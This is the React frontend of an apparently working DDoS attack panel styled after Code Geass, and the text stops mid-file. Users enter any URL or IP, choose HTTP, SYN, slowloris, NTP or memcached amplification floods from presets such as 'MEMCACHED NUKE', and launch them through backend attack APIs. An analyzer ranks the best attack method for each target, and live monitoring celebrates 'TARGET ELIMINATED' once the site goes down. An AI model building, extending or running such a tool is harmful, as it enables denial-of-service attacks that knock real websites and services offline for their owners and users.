import { useState, useEffect, useRef, useCallback } from "react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import geassSymbol from "@assets/IMG_9069_1776196692523.jpeg";
import {
  useListMethods,
  useCreateAttack,
  useGetAttackStats,
  useGetAttack,
  useStopAttack,
  useListAttacks,
} from "@workspace/api-client-react";

const queryClient = new QueryClient({ defaultOptions: { queries: { retry: 1 } } });
const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

/* ── Types ── */
type LogType = "info" | "success" | "error" | "warn";
interface LogEntry { id: number; text: string; type: LogType; ts: number; }
interface CheckResult { up: boolean; status: number; statusText: string; responseTime: number; error: string | null; }
interface Preset { label: string; method: string; packetSize: number; duration: number; delay: number; threads: number; icon: string; }
interface MethodRec { method: string; name: string; score: number; reason: string; suggestedThreads: number; suggestedDuration: number; protocol: string; amplification: number; tier: string; }
interface AnalyzeResult { target: string; ip: string | null; isIP: boolean; httpAvailable: boolean; httpsAvailable: boolean; responseTimeMs: number; serverHeader: string; isCDN: boolean; cdnProvider: string; openPorts: number[]; recommendations: MethodRec[]; }

/* ── Method classification (frontend mirror of backend) ── */
const L7_HTTP_FE = new Set(["http-flood","http-bypass","http2-flood","slowloris","rudy"]);
const L4_TCP_FE  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const methodInfo = (m: string) => {
  if (m === "geass-override") return { badge: "GEASS ∞", cls: "geass", color: "#C0392B" };
  if (L7_HTTP_FE.has(m)) return { badge: "REAL HTTP", cls: "real-http", color: "#2ecc71" };
  if (L4_TCP_FE.has(m))  return { badge: "REAL TCP",  cls: "real-tcp",  color: "#3498db" };
  return { badge: "SIMULATED", cls: "simulated", color: "#8A7B65" };
};

/* ── Presets ── */
const PRESETS: Preset[] = [
  { label: "Quick Strike",   method: "http-flood",     packetSize: 64,   duration: 30,  delay: 50,  threads: 8,   icon: "⚡" },
  { label: "Heavy Assault",  method: "udp-flood",      packetSize: 1024, duration: 120, delay: 10,  threads: 64,  icon: "💥" },
  { label: "Stealth Mode",   method: "slowloris",      packetSize: 32,   duration: 300, delay: 500, threads: 4,   icon: "🥷" },
  { label: "SYN Hammer",     method: "syn-flood",      packetSize: 40,   duration: 90,  delay: 5,   threads: 128, icon: "🔨" },
  { label: "NTP Nuclear",    method: "ntp-amp",        packetSize: 46,   duration: 60,  delay: 5,   threads: 256, icon: "☢️" },
  { label: "MEMCACHED NUKE", method: "mem-amp",        packetSize: 15,   duration: 30,  delay: 1,   threads: 512, icon: "💀" },
  { label: "Geass Override", method: "geass-override", packetSize: 512,  duration: 120, delay: 0,   threads: 512, icon: "👁" },
];

/* ── Log counter ── */
let _lid = 0;
const mkLog = (text: string, type: LogType = "info"): LogEntry => ({ id: ++_lid, text, type, ts: Date.now() });

/* ── Audio ── */
function playTone(type: "start" | "stop" | "tick" | "check" | "kill") {
  try {
    const ctx = new AudioContext();
    const o = ctx.createOscillator();
    const g = ctx.createGain();
    o.connect(g); g.connect(ctx.destination);
    const t = ctx.currentTime;
    if (type === "start") {
      o.type = "sawtooth";
      o.frequency.setValueAtTime(110, t); o.frequency.exponentialRampToValueAtTime(880, t + 0.3);
      g.gain.setValueAtTime(0.12, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
      o.start(); o.stop(t + 0.55);
    } else if (type === "stop") {
      o.type = "sine";
      o.frequency.setValueAtTime(440, t); o.frequency.exponentialRampToValueAtTime(110, t + 0.4);
      g.gain.setValueAtTime(0.09, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.5);
      o.start(); o.stop(t + 0.55);
    } else if (type === "kill") {
      o.type = "square";
      o.frequency.setValueAtTime(60, t); o.frequency.exponentialRampToValueAtTime(20, t + 0.8);
      g.gain.setValueAtTime(0.2, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.9);
      o.start(); o.stop(t + 1.0);
    } else if (type === "tick") {
      o.type = "sine";
      o.frequency.setValueAtTime(600, t);
      g.gain.setValueAtTime(0.03, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.04);
      o.start(); o.stop(t + 0.05);
    } else {
      o.type = "triangle";
      o.frequency.setValueAtTime(528, t); o.frequency.exponentialRampToValueAtTime(1056, t + 0.18);
      g.gain.setValueAtTime(0.07, t); g.gain.exponentialRampToValueAtTime(0.001, t + 0.25);
      o.start(); o.stop(t + 0.3);
    }
  } catch { /* blocked */ }
}

/* ── Formatters ── */
const fmtNum  = (n: number) => n.toLocaleString();
const fmtBps  = (n: number) => {
  // Convert bytes/s → bits/s for Gbps display
  const bps = n * 8;
  if (bps >= 1e12) return (bps / 1e12).toFixed(2) + " Tbps";
  if (bps >= 1e9)  return (bps / 1e9).toFixed(2)  + " Gbps";
  if (bps >= 1e6)  return (bps / 1e6).toFixed(1)  + " Mbps";
  if (bps >= 1e3)  return (bps / 1e3).toFixed(1)  + " Kbps";
  return bps + " bps";
};
const fmtBytes = (n: number) => {
  if (n >= 1e12) return (n / 1e12).toFixed(2) + " TB";
  if (n >= 1e9)  return (n / 1e9).toFixed(2) + " GB";
  if (n >= 1e6)  return (n / 1e6).toFixed(1) + " MB";
  if (n >= 1e3)  return (n / 1e3).toFixed(1) + " KB";
  return n + " B";
};
const statusColor = (code: number) => {
  if (code === 0) return "#777";
  if (code < 300) return "#2ecc71";
  if (code < 400) return "#f39c12";
  if (code < 500) return "#C0392B";
  return "#8e44ad";
};
const powerLevel = (threads: number, m?: string) => {
  if (m === "geass-override") return { label: "ABSOLUTE GEASS", color: "#ff0033", pct: 100 };
  if (threads >= 512) return { label: "GODMODE",   color: "#ff00ff", pct: 100 };
  if (threads >= 256) return { label: "OBLITERATE",color: "#ff0033", pct: 98  };
  if (threads >= 128) return { label: "MAXIMUM",   color: "#ff4400", pct: 92  };
  if (threads >= 64)  return { label: "CRITICAL",  color: "#C0392B", pct: 80  };
  if (threads >= 32)  return { label: "HIGH",      color: "#e67e22", pct: 62  };
  if (threads >= 16)  return { label: "MODERATE",  color: "#D4AF37", pct: 42  };
  if (threads >= 8)   return { label: "LOW",       color: "#8A7B65", pct: 22  };
  return               { label: "MINIMAL",  color: "#5A4E40", pct: 8  };
};

const LOG_MSGS_HTTP = [
  (t: string, n: string) => `♟ ${n} real HTTP requests fired → ${t}`,
  (t: string) => `♟ Flood workers maintaining ${t} under load [LIVE]`,
  (_t: string, n: string) => `♟ ${n} req/s reaching target — HTTP workers active`,
  (t: string) => `♟ Connection pressure on ${t} — hold the line`,
  (_t: string, n: string) => `♟ ${n} HTTP/1.1 requests dispatched this second`,
];
const LOG_MSGS_TCP = [
  (t: string, n: string) => `♟ ${n} TCP SYN packets sent → ${t}:80 [REAL]`,
  (t: string) => `♟ Socket pool flooding ${t} — connection queue growing`,
  (_t: string, n: string) => `♟ ${n} TCP connections/sec — RST storm active`,
  (t: string) => `♟ ${t} connection table under siege`,
];
const LOG_MSGS_SIM = [
  (_t: string, n: string) => `♟ ${n} amplified packets computed [UDP VECTOR]`,
  () => `♟ Amplification multiplier saturating target bandwidth`,
  (_t: string, n: string) => `♟ ${n} pkt/s — UDP flood vector active`,
  () => `♟ Raw socket layer — amplification active`,
];
const LOG_MSGS_GEASS = [
  (t: string, n: string) => `👁 Geass Override: ${n} vectors annihilating ${t} [HTTP+TCP]`,
  (t: string) => `👁 Dual-layer assault — ${t} has no counter to this Geass`,
  (_t: string, n: string) => `👁 ${n} simultaneous HTTP+TCP strikes — target cannot respond`,
  (t: string) => `👁 ${t} connection table and HTTP stack under absolute siege`,
  (_t: string, n: string) => `👁 ${n} requests this second — 550 concurrent vectors active`,
  (t: string) => `👁 The king's Geass has been cast upon ${t} — obey`,
  (_t: string, n: string) => `👁 ${n} pkt/s — HTTP flood + TCP flood vectors simultaneous`,
];

/* ── Sparkline chart ── */
function Sparkline({ data, color = "#D4AF37" }: { data: number[]; color?: string }) {
  if (data.length < 2) return null;
  const W = 200, H = 38;
  const max = Math.max(...data, 1);
  const pts = data.map((v, i) => {
    const x = (i / (data.length - 1)) * W;
    const y = H - (v / max) * (H - 4) - 2;
    return `${x.toFixed(1)},${y.toFixed(1)}`;
  }).join(" ");
  return (
    <svg viewBox={`0 0 ${W} ${H}`} className="lb-sparkline" preserveAspectRatio="none">
      <defs>
        <linearGradient id="spk-g" x1="0" y1="0" x2="0" y2="1">
          <stop offset="0%" stopColor={color} stopOpacity="0.28"/>
          <stop offset="100%" stopColor={color} stopOpacity="0.02"/>
        </linearGradient>
      </defs>
      <polygon points={`0,${H} ${pts} ${W},${H}`} fill="url(#spk-g)"/>
      <polyline points={pts} fill="none" stroke={color} strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/>
    </svg>
  );
}

/* ── Geass Eye SVG ── */
function GeassEye() {
  return (
    <div className="geass-eye-bg" aria-hidden="true">
      <svg viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg">
        <ellipse cx="200" cy="200" rx="180" ry="90" stroke="rgba(212,175,55,0.1)" strokeWidth="1.5" fill="none"/>
        <ellipse cx="200" cy="200" rx="140" ry="70" stroke="rgba(212,175,55,0.07)" strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="55" stroke="rgba(192,57,43,0.22)" strokeWidth="1.5" fill="none"/>
        <circle cx="200" cy="200" r="30" stroke="rgba(192,57,43,0.16)" strokeWidth="1" fill="none"/>
        <circle cx="200" cy="200" r="10" fill="rgba(192,57,43,0.15)"/>
        {Array.from({ length: 12 }, (_, i) => {
          const deg = i * 30;
          const r = (deg * Math.PI) / 180;
          return <line key={i}
            x1={200 + Math.cos(r) * 65} y1={200 + Math.sin(r) * 65}
            x2={200 + Math.cos(r) * 185} y2={200 + Math.sin(r) * 185}
            stroke="rgba(212,175,55,0.06)" strokeWidth="1"/>;
        })}
        {/* Geass symbol lines */}
        <path d="M200,145 L212,170 L240,170 L218,188 L226,215 L200,198 L174,215 L182,188 L160,170 L188,170 Z"
          stroke="rgba(192,57,43,0.12)" strokeWidth="1" fill="none"/>
      </svg>
    </div>
  );
}

/* ── Panel ── */
function Panel() {
  /* Config state */
  const [target, setTarget] = useState("");
  const [method, setMethod] = useState("http-flood");
  const [packetSize, setPacketSize] = useState(64);
  const [duration, setDuration] = useState(60);
  const [delay, setDelay] = useState(100);
  const [threads, setThreads] = useState(16);
  const [webhookUrl, setWebhookUrl] = useState("");
  const [showWebhook, setShowWebhook] = useState(false);

  /* Attack state */
  const [currentAttackId, setCurrentAttackId] = useState<number | null>(null);
  const [isRunning, setIsRunning] = useState(false);
  const [progress, setProgress] = useState(0);

  /* Live metrics — use refs for per-second calculation */
  const [pps, setPps] = useState(0);
  const [bps, setBps] = useState(0);
  const [peakPps, setPeakPps] = useState(0);
  const [peakBps, setPeakBps] = useState(0);
  const [ppsHistory, setPpsHistory] = useState<number[]>([]);
  /* Last attack snapshot (resets on new attack start) */
  const [lastAtkPkts,  setLastAtkPkts]  = useState(0);
  const [lastAtkBytes, setLastAtkBytes] = useState(0);
  const peakPpsRef = useRef(0);
  const peakBpsRef = useRef(0);
  const lastPacketsRef = useRef(0);
  const lastBytesRef   = useRef(0);
  const currentPacketsRef = useRef(0);
  const currentBytesRef   = useRef(0);

  /* Target monitoring */
  const [targetStatus, setTargetStatus] = useState<"unknown" | "online" | "offline">("unknown");
  const targetStatusRef = useRef<"unknown" | "online" | "offline">("unknown");

  /* UI state */
  const [logs, setLogs]             = useState<LogEntry[]>([mkLog("Awaiting Geass command...", "info")]);
  const [soundEnabled, setSoundEnabled] = useState(true);
  const soundRef = useRef(true);
  const [favorites, setFavorites]   = useState<string[]>(() => {
    try { return JSON.parse(localStorage.getItem("lb-favorites") || "[]"); } catch { return []; }
  });
  const [showFavs, setShowFavs]     = useState(false);
  const [showHistory, setShowHistory] = useState(false);
  const [entered, setEntered]       = useState(false);

  /* Site checker */
  const [checkerUrl, setCheckerUrl]     = useState("");
  const [checkerResult, setCheckerResult] = useState<CheckResult | null>(null);
  const [isChecking, setIsChecking]     = useState(false);

  /* Analyzer */
  const [analyzeResult, setAnalyzeResult] = useState<AnalyzeResult | null>(null);
  const [isAnalyzing, setIsAnalyzing]   = useState(false);
  const [showAnalyze, setShowAnalyze]   = useState(false);

  /* Refs */
  const terminalRef    = useRef<HTMLDivElement>(null);
  const startTimeRef   = useRef<number | null>(null);
  const durationRef    = useRef(60);
  const isRunningRef   = useRef(false);
  const targetRef      = useRef("");

  /* Queries */
  const { data: methods = [] } = useListMethods();
  const createAttack = useCreateAttack();
  const stopAttack   = useStopAttack();
  const { data: stats, refetch: refetchStats } = useGetAttackStats({ query: { refetchInterval: 10000 } });
  const { data: currentAttack, refetch: refetchAttack } = useGetAttack(
    currentAttackId ?? 0,
    { query: { enabled: currentAttackId !== null, refetchInterval: isRunning ? 600 : false } }
  );
  const { data: allAttacks = [], refetch: refetchHistory } = useListAttacks(
    { query: { refetchInterval: showHistory ? 5000 : false } }
  );

  const addLog = useCallback((text: string, type: LogType = "info") => {
    setLogs(prev => [...prev.slice(-99), mkLog(text, type)]);
  }, []);

  /* Sync sound ref */
  useEffect(() => { soundRef.current = soundEnabled; }, [soundEnabled]);

  /* Page entrance */
  useEffect(() => { setEntered(true); }, []);

  /* Scroll terminal */
  useEffect(() => {
    if (terminalRef.current) terminalRef.current.scrollTop = terminalRef.current.scrollHeight;
  }, [logs]);

  /* Sync current packets/bytes to refs for metric calculation */
  useEffect(() => {
    if (!currentAttack) return;
    currentPacketsRef.current = currentAttack.packetsSent ?? 0;
    currentBytesRef.current   = currentAttack.bytesSent   ?? 0;
  }, [currentAttack]);

  /* Per-second metric calculation */
  useEffect(() => {
    if (!isRunning) { setPps(0); setBps(0); return; }
    lastPacketsRef.current = currentPacketsRef.current;
    lastBytesRef.current   = currentBytesRef.current;

    const iv = setInterval(() => {
      const nowPkts  = currentPacketsRef.current;
      const nowBytes = currentBytesRef.current;
      const deltaPkts  = Math.max(0, nowPkts  - lastPacketsRef.current);
      const deltaBytes = Math.max(0, nowBytes - lastBytesRef.current);
      lastPacketsRef.current = nowPkts;
      lastBytesRef.current   = nowBytes;
      setPps(deltaPkts);
      setBps(deltaBytes);
      // Track history for sparkline
      setPpsHistory(prev => [...prev.slice(-29), deltaPkts]);
      // Track peaks
      if (deltaPkts > peakPpsRef.current) { peakPpsRef.current = deltaPkts; setPeakPps(deltaPkts); }
      if (deltaBytes > peakBpsRef.current) { peakBpsRef.current = deltaBytes; setPeakBps(deltaBytes); }
      if (deltaPkts > 0) {
        const n = fmtNum(deltaPkts);
        const t = targetRef.current;
        let msgs: ((t: string, n: string) => string)[];
        if (method === "geass-override") msgs = LOG_MSGS_GEASS;
        else if (L7_HTTP_FE.has(method)) msgs = LOG_MSGS_HTTP;
        else if (L4_TCP_FE.has(method)) msgs = LOG_MSGS_TCP;
        else msgs = LOG_MSGS_SIM;
        addLog(msgs[Math.floor(Math.random() * msgs.length)](t, n), "info");
        if (soundRef.current) playTone("tick");
      }
    }, 1000);
    return () => clearInterval(iv);
  }, [isRunning, method, addLog]);

  /* Progress bar timer */
  useEffect(() => {
    if (!isRunning || startTimeRef.current === null) return;
    const iv = setInterval(() => {
      if (startTimeRef.current === null) return;
      const elapsed = (Date.now() - startTimeRef.current) / 1000;
      const pct = Math.min((elapsed / durationRef.current) * 100, 100);
      setProgress(pct);
      if (pct >= 100) {
        setIsRunning(false); isRunningRef.current = false;
        setProgress(100); setPps(0); setBps(0);
        setLastAtkPkts(currentPacketsRef.current);
        setLastAtkBytes(currentBytesRef.current);
        addLog(`♟ Operation complete — ${currentPacketsRef.current.toLocaleString()} requests sent in ${durationRef.current}s`, "success");
        if (soundRef.current) playTone("stop");
        if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
        refetchStats(); refetchHistory();
        clearInterval(iv);
      }
    }, 500);
    return () => clearInterval(iv);
  }, [isRunning, addLog, refetchStats, refetchHistory]);

  /* Target down detection during attack */
  useEffect(() => {
    if (!isRunning || !targetRef.current) return;
    let cancelled = false;

    const checkTarget = async () => {
      if (!isRunningRef.current || cancelled) return;
      try {
        const urlToCheck = targetRef.current;
        const res = await fetch(`${BASE}/api/check`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ url: urlToCheck }),
        });
        const data: CheckResult = await res.json();
        if (cancelled) return;

        const prev = targetStatusRef.current;
        const now  = data.up ? "online" : "offline";
        targetStatusRef.current = now;
        setTargetStatus(now);

        if (prev === "online" && now === "offline") {
          addLog(`💥 TARGET DOWN! ${urlToCheck} is not responding — HTTP ${data.status || "OFFLINE"} (${data.responseTime}ms)`, "success");
          addLog(`💥 MISSION ACCOMPLISHED — TARGET ELIMINATED`, "success");
          if (soundRef.current) playTone("kill");
          if ("vibrate" in navigator) navigator.vibrate([300, 100, 300, 100, 500]);
        } else if (prev === "offline" && now === "online") {
          addLog(`⚠ Target recovered: HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`, "warn");
        } else if (prev === "unknown") {
          addLog(`♟ Target baseline: ${now === "online" ? "ONLINE" : "OFFLINE"} — HTTP ${data.status || "N/A"} (${data.responseTime}ms)`, "info");
        }
      } catch { /* network error — skip check */ }
    };

    const initialTimeout = setTimeout(checkTarget, 3000);
    const iv = setInterval(checkTarget, 6000);

    return () => {
      cancelled = true;
      clearTimeout(initialTimeout);
      clearInterval(iv);
      setTargetStatus("unknown");
      targetStatusRef.current = "unknown";
    };
  }, [isRunning, addLog]);

  /* Refetch current attack while running */
  useEffect(() => {
    if (!isRunning || currentAttackId === null) return;
    const iv = setInterval(() => { refetchAttack(); }, 600);
    return () => clearInterval(iv);
  }, [isRunning, currentAttackId, refetchAttack]);

  /* ── Actions ── */
  async function handleLaunch() {
    if (!target.trim()) { addLog("✕ No target — enter a URL or IP address.", "error"); return; }

    if (isRunning) {
      addLog("♟ Revoking Geass — halting strike...", "warn");
      if (currentAttackId !== null) {
        try {
          await stopAttack.mutateAsync({ id: currentAttackId });
          addLog("♟ Strike halted by royal decree.", "success");
          if (soundRef.current) playTone("stop");
          if ("vibrate" in navigator) navigator.vibrate([100, 50, 100]);
        } catch { addLog("✕ Failed to stop attack.", "error"); }
      }
      setLastAtkPkts(currentPacketsRef.current);
      setLastAtkBytes(currentBytesRef.current);
      setIsRunning(false); isRunningRef.current = false;
      setProgress(0); setCurrentAttackId(null);
      setPps(0); setBps(0); setTargetStatus("unknown");
      refetchHistory(); refetchStats();
      return;
    }

    const port = method.includes("http") || method === "geass-override" ? 80 : method.includes("dns") ? 53 : 443;
    if (method === "geass-override") {
      addLog(`👁 ABSOLUTE GEASS COMMAND — target: ${target}`, "info");
      addLog(`  Dual-vector: HTTP flood (250w) + TCP flood (300w) | Threads: ${threads} | Duration: ${duration}s`, "info");
    } else {
      addLog(`♟ Geass granted — target: ${target}`, "info");
      addLog(`  Vector: ${method.toUpperCase()} | Threads: ${threads} | Duration: ${duration}s`, "info");
    }
    if (soundRef.current) playTone("start");
    if ("vibrate" in navigator) navigator.vibrate([200]);

    try {
      const result = await createAttack.mutateAsync({
        data: { target: target.trim(), port, method, duration, threads, webhookUrl: webhookUrl.trim() || null },
      });
      setCurrentAttackId(result.id);
      setIsRunning(true); isRunningRef.current = true;
      targetRef.current = target.trim();
      startTimeRef.current = Date.now();
      durationRef.current = duration;
      currentPacketsRef.current = 0; currentBytesRef.current = 0;
      lastPacketsRef.current = 0;   lastBytesRef.current = 0;
      peakPpsRef.current = 0; peakBpsRef.current = 0;
      setProgress(0); setPps(0); setBps(0); setPeakPps(0); setPeakBps(0); setPpsHistory([]);
      setLastAtkPkts(0); setLastAtkBytes(0);
      const mi = methodInfo(method);
      addLog(`♟ Strike launched [ID #${result.id}] — vector: ${method.toUpperCase()} [${mi.badge}]`, "success");
      saveFavorite(target.trim()); refetchHistory(); refetchStats();
    } catch { addLog("✕ Launch failed — check backend connection.", "error"); }
  }

  function saveFavorite(url: string) {
    setFavorites(prev => {
      if (prev.includes(url)) return prev;
      const next = [url, ...prev].slice(0, 10);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }
  function removeFavorite(url: string) {
    setFavorites(prev => {
      const next = prev.filter(f => f !== url);
      localStorage.setItem("lb-favorites", JSON.stringify(next)); return next;
    });
  }
  function applyPreset(p: Preset) {
    setMethod(p.method); setPacketSize(p.packetSize);
    setDuration(p.duration); setDelay(p.delay); setThreads(p.threads);
    addLog(`♟ Preset: ${p.label} — ${p.method.toUpperCase()}, ${p.threads} threads, ${p.duration}s`, "info");
    if (soundRef.current) playTone("tick");
  }
  function handleClearLogs() { setLogs([mkLog("Terminal cleared.", "info")]); }
  function handleExportLogs() {
    const txt = logs.map(l => `[${new Date(l.ts).toISOString()}] [${l.type.toUpperCase()}] ${l.text}`).join("\n");
    const blob = new Blob([txt], { type: "text/plain" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a"); a.href = url;
    a.download = `lelouch-log-${Date.now()}.txt`; a.click();
    URL.revokeObjectURL(url);
    addLog("♟ Logs exported.", "success");
  }
  async function handleAnalyze() {
    const urlToAnalyze = target.trim();
    if (!urlToAnalyze) { addLog("✕ Enter a target URL or IP to analyze.", "error"); return; }
    setIsAnalyzing(true); setAnalyzeResult(null); setShowAnalyze(true);
    addLog(`♟ Intelligence gathering on ${urlToAnalyze}...`, "info");
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/analyze`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToAnalyze }),
      });
      const data: AnalyzeResult = await res.json();
      setAnalyzeResult(data);
      const best = data.recommendations[0];
      addLog(`♟ Analysis complete: ${data.recommendations.length} vectors ranked`, "success");
      if (best) addLog(`♟ Best method: ${best.name} [Tier ${best.tier}] — score ${best.score}/100`, "success");
      if (data.isCDN) addLog(`⚠ CDN detected (${data.cdnProvider}) — layer 7 attacks partially mitigated`, "warn");
      if (soundRef.current) playTone("check");
    } catch { addLog("✕ Analysis failed — check backend connection.", "error"); }
    setIsAnalyzing(false);
  }

  async function handleCheckSite() {
    const urlToCheck = checkerUrl.trim() || target.trim();
    if (!urlToCheck) { addLog("✕ Enter a URL to check.", "error"); return; }
    setIsChecking(true); setCheckerResult(null);
    if (soundRef.current) playTone("tick");
    try {
      const res = await fetch(`${BASE}/api/check`, {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ url: urlToCheck }),
      });
      const data: CheckResult = await res.json();
      setCheckerResult(data);
      if (soundRef.current) playTone("check");
      addLog(
        data.up
          ? `♟ ${urlToCheck} → HTTP ${data.status} ${data.statusText} (${data.responseTime}ms)`
          : `✕ ${urlToCheck} → OFFLINE — ${data.statusText} (${data.responseTime}ms)`,
        data.up ? "success" : "error"
      );
    } catch { addLog("✕ Check failed — network error.", "error"); }
    setIsChecking(false);
  }

  const pw = powerLevel(threads, method);
  const mi = methodInfo(method);
  const totalPackets = isRunning ? (currentAttack?.packetsSent ?? 0) : lastAtkPkts;
  const totalBytes   = isRunning ? (currentAttack?.bytesSent   ?? 0) : lastAtkBytes;

  /* ── JSX ── */
  return (
    <div className={`lb-page ${entered ? "lb-entered" : ""}`}>
      <GeassEye />
      <div className="lb-wrap">

        {/* ── Header ── */}
        <header className="lb-header">
          {isRunning && (
            <div className={`lb-badge ${targetStatus === "offline" ? "lb-badge--kill" : ""}`}>
              <span className="lb-badge-dot" />
              {targetStatus === "offline" ? "TARGET ELIMINATED" : method === "geass-override" ? "GEASS OVERRIDE ACTIVE" : "GEASS ACTIVE"}
            </div>
          )}
          <div className="lb-title-row">
            <img src={geassSymbol} className="lb-header-symbol" alt="Geass" />
            <h1 className="lb-title">Lelouch Britannia</h1>
            <img src={geassSymbol} className="lb-header-symbol lb-header-symbol--flip" alt="" aria-hidden="true"/>
          </div>
          <p className="lb-sub">Because absolute power is even more beautiful when wielded by Zero.</p>
        </header>

        {/* ── Presets ── */}
        <div className="lb-presets">
          {PRESETS.map(p => (
            <button
              key={p.label}
              className={`lb-preset${p.method === "geass-override" ? " lb-preset--geass" : ""}`}
              onClick={() => applyPreset(p)}
            >
              {p.method === "geass-override"
                ? <img src={geassSymbol} className="lb-preset-symbol" alt=""/>
                : <span>{p.icon}</span>
              }
              {p.label}
            </button>
          ))}
        </div>

        {/* ── Card ── */}
        <div className={`lb-card ${isRunning ? "lb-card--active" : ""}`}>
          {/* GIF */}
          <div className="lb-gif-wrap">
            <img src="/lelouch.gif" alt="Lelouch vi Britannia" className="lb-gif"/>
            <div className="lb-scanlines" aria-hidden="true"/>
            <div className="lb-gif-fade" aria-hidden="true"/>
            <img
              src={geassSymbol}
              className={`lb-gif-symbol${isRunning && method === "geass-override" ? " lb-gif-symbol--active" : ""}`}
              aria-hidden="true"
              alt=""
            />
            {isRunning && (
              <div className={`lb-attack-overlay${method === "geass-override" ? " lb-attack-overlay--geass" : ""}`} aria-hidden="true">
                <span className="lb-attack-overlay-text">
                  {method === "geass-override" ? "ABSOLUTE GEASS OVERRIDE" : "ATTACK IN PROGRESS"}
                </span>
              </div>
            )}
          </div>

          <div className="lb-body">
            {/* Target */}
            <div className="lb-target-row">
              <div className="lb-input-wrap">
                <input
                  className="lb-input"
                  type="text"
                  placeholder="Enter target URL or IP address"
                  value={target}
                  onChange={e => { setTarget(e.target.value); setShowFavs(false); }}
                  onFocus={() => { if (favorites.length > 0) setShowFavs(true); }}
                  onBlur={() => setTimeout(() => setShowFavs(false), 160)}
                  onKeyDown={e => e.key === "Enter" && handleLaunch()}
                  autoComplete="off"
                />
                {showFavs && (
                  <div className="lb-favs">
                    {favorites.map(f => (
                      <div key={f} className="lb-fav-item">
                        <span className="lb-fav-url" onClick={() => { setTarget(f); setShowFavs(false); }}>{f}</span>
                        <button className="lb-fav-rm" onClick={e => { e.stopPropagation(); removeFavorite(f); }}>✕</button>
                      </div>
                    ))}
                  </div>
                )}
              </div>
              {target.trim() && !favorites.includes(target.trim()) && (
                <button className="lb-star-btn" title="Save target" onClick={() => saveFavorite(target.trim())}>★</button>
              )}
            </div>

            {/* Action row */}
            <div className="lb-action-row">
              <button
                className={`lb-btn-launch ${isRunning ? "lb-btn-stop" : ""}`}
                onClick={handleLaunch}
                disabled={createAttack.isPending}
              >
                <span className="lb-btn-glyph">♟</span>
                {isRunning ? "ABORT GEASS" : "COMMAND GEASS"}
              </button>
              <button className="lb-btn-icon lb-btn-gold" title="Clear terminal" onClick={handleClearLogs}>⚡</button>
              <button className="lb-btn-icon lb-btn-dim"  title="Export logs"    onClick={handleExportLogs}>⎘</button>
              <button className={`lb-btn-icon ${soundEnabled ? "lb-btn-gold" : "lb-btn-dim"}`}
                title={soundEnabled ? "Mute" : "Unmute"} onClick={() => setSoundEnabled(v => !v)}>
                {soundEnabled ? "🔊" : "🔇"}
              </button>
              <button
                className={`lb-btn-icon lb-btn-analyze ${isAnalyzing ? "lb-btn-analyzing" : ""}`}
                title="Analyze target — find the best attack method"
                onClick={handleAnalyze}
                disabled={isAnalyzing || !target.trim()}
              >
                {isAnalyzing ? "⏳" : "🔍"}
              </button>
            </div>

            {/* ── Analyzer Panel ── */}
            {showAnalyze && (
              <div className="lb-analyzer">
                <div className="lb-analyzer-header">
                  <span className="lb-analyzer-title">♟ INTELLIGENCE ANALYSIS</span>
                  <button className="lb-analyzer-close" onClick={() => setShowAnalyze(false)}>✕</button>
                </div>

                {isAnalyzing && (
                  <div className="lb-analyzer-loading">
                    <div className="lb-analyzer-spinner"/>
                    <span>Scanning target vectors...</span>
                  </div>
                )}

                {!isAnalyzing && analyzeResult && (
                  <>
                    {/* Target info strip */}
                    <div className="lb-analyze-info">
                      <span className="lai-item"><span className="lai-key">TARGET</span>{analyzeResult.target}</span>
                      {analyzeResult.ip && <span className="lai-item"><span className="lai-key">IP</span>{analyzeResult.ip}</span>}
                      <span className="lai-item">
                        <span className="lai-key">HTTP</span>
                        <span style={{ color: analyzeResult.httpAvailable || analyzeResult.httpsAvailable ? "#2ecc71" : "#C0392B" }}>
                          {analyzeResult.httpAvailable ? "80 ✓" : ""}{analyzeResult.httpAvailable && analyzeResult.httpsAvailable ? "  " : ""}{analyzeResult.httpsAvailable ? "443 ✓" : ""}
                          {!analyzeResult.httpAvailable && !analyzeResult.httpsAvailable ? "CLOSED" : ""}
                        </span>
                      </span>
                      {analyzeResult.responseTimeMs > 0 && (
                        <span className="lai-item"><span className="lai-key">LATENCY</span>
                          <span style={{ color: analyzeResult.responseTimeMs > 500 ? "#e67e22" : "#2ecc71" }}>{analyzeResult.responseTimeMs}ms</span>
                        </span>
                      )}
                      {analyzeResult.serverHeader && (
                        <span className="lai-item"><span className="lai-key">SERVER</span>{analyzeResult.serverHeader}</span>
                      )}
                      {analyzeResult.isCDN && (
                        <span className="lai-item lai-cdn">
                          <span className="lai-key">CDN</span>{analyzeResult.cdnProvider} ⚠
                        </span>
                      )}
                    </div>

                    {/* Recommendations */}
                    <div className="lb-recs">
                      {analyzeResult.recommendations.map((rec, i) => (
                        <div key={rec.method} className={`lb-rec ${i === 0 ? "lb-rec--best" : ""}`}>
                          <div className="lrec-left">
                            <span className={`lrec-tier lrec-tier--${rec.tier.toLowerCase()}`}>{rec.tier}</span>
                            <div className="lrec-info">
                              <div className="lrec-name">
                                {i === 0 && <span className="lrec-crown">★ BEST — </span>}
                                {rec.name}
                                {rec.amplification > 1 && (
                                  <span className="lrec-amp">{rec.amplification}x AMP</span>
                                )}
                                <span className="lrec-proto">{rec.protocol}</span>
                              </div>
                              <div className="lrec-reason">{rec.reason}</div>
                              <div className="lrec-bar-wrap">
                                <div className="lrec-bar" style={{ width: `${rec.score}%`, background: rec.score >= 90 ? "#ff0033" : rec.score >= 75 ? "#D4AF37" : rec.score >= 60 ? "#e67e22" : "#666" }}/>
